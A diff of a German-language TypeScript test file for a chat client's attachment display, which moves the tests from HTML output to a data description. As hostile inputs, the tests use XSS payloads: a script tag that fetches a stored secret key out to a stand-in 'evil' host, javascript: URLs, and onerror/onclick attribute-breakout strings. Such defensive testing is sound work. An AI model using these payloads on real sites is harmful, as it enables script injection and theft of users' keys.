@@ -12,7 +12,7 @@ import {
   escapeHtml,
   pkShort,
   isSafeAttachmentUrl,
-  renderAttachment,
+  anhangAnsicht,
   isForeignPaymentNoise,
   fmtSats,
   fmtSol,
@@ -102,63 +102,50 @@ test("Anhang-URLs: erlaubte Schemata funktionieren weiter", () => {
 
 // ------------------------------------------------------------- Anhänge
 
-test("Anhang: boesartiger Dateiname landet nicht als HTML im Dokument", () => {
-  const html = renderAttachment({
-    name: `<script>fetch('http://evil/?k='+localStorage['freedom.sk'])</script>`,
-    mime: "image/png",
-    size: 1,
-    url: "https://ok.example/a.png",
-  });
-  assert.ok(!html.includes("<script"), "genau dieser Weg war der alte XSS-Pfad");
-  assert.ok(html.includes("<img"));
+// Seit C-6c beschreibt anhangAnsicht() den Anhang, statt HTML zu bauen: Name, Typ und
+// Adresse bleiben Daten, die Oberfläche setzt sie nur als Eigenschaft, dataset oder Text
+// (dom-statt-html.test.ts, Smoke „fremdtext“). Geprüft wird hier, was erscheint.
+
+test("Anhang: boesartiger Dateiname bleibt ein Name – das Bild nur mit geprüfter Adresse", () => {
+  const name = `<script>fetch('http://evil/?k='+localStorage['freedom.sk'])</script>`;
+  assert.deepEqual(anhangAnsicht({ name, mime: "image/png", size: 1, url: "https://ok.example/a.png" }),
+    { art: "bild", url: "https://ok.example/a.png", name }, "genau dieser Weg war der alte XSS-Pfad – jetzt nur noch alt-Text");
 });
 
 test("Anhang: boesartige URL wird nicht als Quelle gesetzt", () => {
-  const html = renderAttachment({
-    name: "bild", mime: "image/png", size: 1, url: "javascript:alert(1)",
-  });
-  assert.ok(!html.includes("javascript:"));
-  assert.match(html, /nicht unterstützt/);
+  const v = anhangAnsicht({ name: "bild", mime: "image/png", size: 1, url: "javascript:alert(1)" });
+  assert.equal(v.art, "hinweis");
+  assert.ok(!JSON.stringify(v).includes("javascript:"));
+  assert.match((v as { text: string }).text, /nicht unterstützt/);
 });
 
-test("Anhang: boesartiger Name in der Meldung ueber einen abgelehnten Link wird maskiert (8.16g1)", () => {
-  const html = renderAttachment({ name: "<img src=x onerror=alert(1)>", mime: "image/png", size: 1, url: "javascript:alert(1)" });
-  assert.ok(!html.includes("<img"), html);
-  assert.match(html, /&#60;img src=x onerror=alert\(1\)&#62;/);
+test("Anhang: boesartiger Name in der Meldung ueber einen abgelehnten Link bleibt Text (8.16g1)", () => {
+  const v = anhangAnsicht({ name: "<img src=x onerror=alert(1)>", mime: "image/png", size: 1, url: "javascript:alert(1)" });
+  assert.deepEqual(v, { art: "hinweis", text: "[Anhang mit nicht unterstütztem Link: <img src=x onerror=alert(1)>]" });
 });
 
-test("Anhang: Anfuehrungszeichen in der URL brechen das Attribut nicht auf", () => {
-  const html = renderAttachment({
-    name: "x", mime: "image/png", size: 1,
-    url: `https://ok.io/a.png" onerror="alert(1)`,
-  });
-  assert.ok(!html.includes('onerror="alert'), "Attribut darf nicht ausbrechbar sein");
+test("Anhang: Anfuehrungszeichen in der URL bleiben Teil der Adresse", () => {
+  const url = `https://ok.io/a.png" onerror="alert(1)`;
+  // Als Eigenschaft (img.src) gibt es kein Attribut, aus dem sie ausbrechen könnten
+  assert.deepEqual(anhangAnsicht({ name: "x", mime: "image/png", size: 1, url }), { art: "bild", url, name: "x" });
 });
 
 test("Anhang: Medientypen werden passend dargestellt", () => {
-  const bild = renderAttachment({ name: "a", mime: "image/png", size: 1, url: "https://x.io/a.png" });
-  const video = renderAttachment({ name: "a", mime: "VIDEO/MP4", size: 1, url: "https://x.io/a.mp4" });
-  const audio = renderAttachment({ name: "a", mime: "audio/ogg", size: 1, url: "https://x.io/a.ogg" });
-  const datei = renderAttachment({ name: "a", mime: "application/pdf", size: 1, url: "https://x.io/a.pdf" });
-
-  assert.match(bild, /<img/);
-  assert.match(video, /<video/, "Grossschreibung im MIME-Typ darf nichts kaputtmachen");
-  assert.match(audio, /<audio/);
-  assert.match(datei, /<a /);
-  assert.match(datei, /rel="noopener noreferrer"/, "fremde Links duerfen kein window.opener bekommen");
+  const art = (mime: string, url: string) => anhangAnsicht({ name: "a", mime, size: 1, url }).art;
+  assert.equal(art("image/png", "https://x.io/a.png"), "bild");
+  assert.equal(art("VIDEO/MP4", "https://x.io/a.mp4"), "video", "Grossschreibung im MIME-Typ darf nichts kaputtmachen");
+  assert.equal(art("audio/ogg", "https://x.io/a.ogg"), "audio");
+  assert.deepEqual(anhangAnsicht({ name: "a", mime: "application/pdf", size: 1, url: "https://x.io/a.pdf" }),
+    { art: "link", url: "https://x.io/a.pdf", text: "📎 a" }, "fremde Links bekommen kein window.opener – rel setzt die Oberfläche");
 });
 
-test("Anhang: Blob-Verweis wird zum Ladeknopf, ID escaped", () => {
-  const html = renderAttachment({
-    name: "gross.zip", mime: "application/zip", size: 1,
-    url: `freedom-blob:abc" onclick="alert(1)`,
-  });
-  assert.match(html, /chat-blob-btn/);
-  assert.ok(!html.includes('onclick="alert'));
+test("Anhang: Blob-Verweis wird zum Ladeknopf, die ID bleibt Daten", () => {
+  const v = anhangAnsicht({ name: "gross.zip", mime: "application/zip", size: 1, url: `freedom-blob:abc" onclick="alert(1)` });
+  assert.deepEqual(v, { art: "knopf", text: "📥 gross.zip", daten: { blob: `abc" onclick="alert(1)`, name: "gross.zip" } });
 });
 
 test("Anhang: leerer Name bekommt eine Beschriftung", () => {
-  assert.match(renderAttachment({ name: "", mime: "x/y", size: 0, url: "https://x.io/a" }), /datei/);
+  assert.deepEqual(anhangAnsicht({ name: "", mime: "x/y", size: 0, url: "https://x.io/a" }), { art: "link", url: "https://x.io/a", text: "📎 datei" });
 });
 
 // ------------------------------------------------------------- Formate
@@ -276,25 +263,25 @@ test("imeta: fehlerhafte Tags bringen die Anzeige nicht zum Absturz", () => {
 const ENC = verschluesseleDatei(new Uint8Array([1, 2, 3])).schluessel;
 
 test("2.4: verschluesselter Anhang wird ein Knopf mit geprueftem Schluessel, nie eine Quelle", () => {
-  const blob = renderAttachment({ name: "befund.pdf", mime: "application/pdf", size: 9, url: "freedom-blob:abc123", enc: ENC });
-  assert.match(blob, /class="ghost copy-btn chat-blob-btn" data-blob="abc123"/);
-  assert.ok(blob.includes(`data-key="${ENC.key}"`) && blob.includes(`data-nonce="${ENC.nonce}"`) && blob.includes(`data-ox="${ENC.ox}"`));
-  assert.match(blob, /🔒 befund\.pdf/);
-  const blossom = renderAttachment({ name: "bild", mime: "image/png", size: 9, url: "https://blossom.example/ab", enc: ENC });
-  assert.match(blossom, /data-url="https:\/\/blossom\.example\/ab"/);
-  assert.doesNotMatch(blossom, /<img/, "Chiffrat nie als Bild einbinden");
+  const blob = anhangAnsicht({ name: "befund.pdf", mime: "application/pdf", size: 9, url: "freedom-blob:abc123", enc: ENC });
+  assert.deepEqual(blob, {
+    art: "knopf", text: "🔒 befund.pdf",
+    daten: { blob: "abc123", key: ENC.key, nonce: ENC.nonce, ox: ENC.ox, mime: "application/pdf", name: "befund.pdf" },
+  });
+  const blossom = anhangAnsicht({ name: "bild", mime: "image/png", size: 9, url: "https://blossom.example/ab", enc: ENC });
+  assert.equal(blossom.art, "knopf", "Chiffrat nie als Bild einbinden");
+  assert.equal((blossom as { daten: Record<string, string> }).daten.url, "https://blossom.example/ab");
 });
 
 test("2.4: kaputter Schluessel, fremdes Schema, boesartiger Typ und Name", () => {
-  const kaputt = renderAttachment({ name: "x", mime: "image/png", size: 1, url: "freedom-blob:a", enc: { ...ENC, key: `${ENC.key.slice(2)}"><script>` } });
-  assert.match(kaputt, /ungültigem Schlüssel/);
-  assert.doesNotMatch(kaputt, /<script/);
-  assert.match(renderAttachment({ name: "x", mime: "", size: 1, url: "javascript:alert(1)", enc: ENC }), /nicht unterstützt/);
-  assert.match(renderAttachment({ name: "x", mime: "", size: 1, url: "http://klartext.example/a", enc: ENC }), /nicht unterstützt/, "nur https");
-  const boese = renderAttachment({ name: `"><img src=x onerror=alert(1)>`, mime: `x" onclick="alert(1)`, size: 1, url: "freedom-blob:a", enc: ENC });
-  // Maskiert bleibt es Text: kein neues Tag, kein ausbrechendes Attribut
-  assert.doesNotMatch(boese, /<img|" onclick="/);
-  assert.match(boese, /data-mime="x&#34; onclick=&#34;alert\(1\)"/);
+  const kaputt = anhangAnsicht({ name: "x", mime: "image/png", size: 1, url: "freedom-blob:a", enc: { ...ENC, key: `${ENC.key.slice(2)}"><script>` } });
+  assert.deepEqual(kaputt, { art: "hinweis", text: "[Anhang mit ungültigem Schlüssel: x]" });
+  assert.match((anhangAnsicht({ name: "x", mime: "", size: 1, url: "javascript:alert(1)", enc: ENC }) as { text: string }).text, /nicht unterstützt/);
+  assert.match((anhangAnsicht({ name: "x", mime: "", size: 1, url: "http://klartext.example/a", enc: ENC }) as { text: string }).text, /nicht unterstützt/, "nur https");
+  const name = `"><img src=x onerror=alert(1)>`;
+  const boese = anhangAnsicht({ name, mime: `x" onclick="alert(1)`, size: 1, url: "freedom-blob:a", enc: ENC });
+  // Bleibt Daten: als dataset gesetzt, gibt es kein neues Tag und kein ausbrechendes Attribut
+  assert.deepEqual(boese, { art: "knopf", text: `🔒 ${name}`, daten: { blob: "a", key: ENC.key, nonce: ENC.nonce, ox: ENC.ox, mime: `x" onclick="alert(1)`, name } });
 });
 
 test("2.4: Schluessel im imeta-Tag hin und zurueck, ohne Schluessel wie bisher", () => {
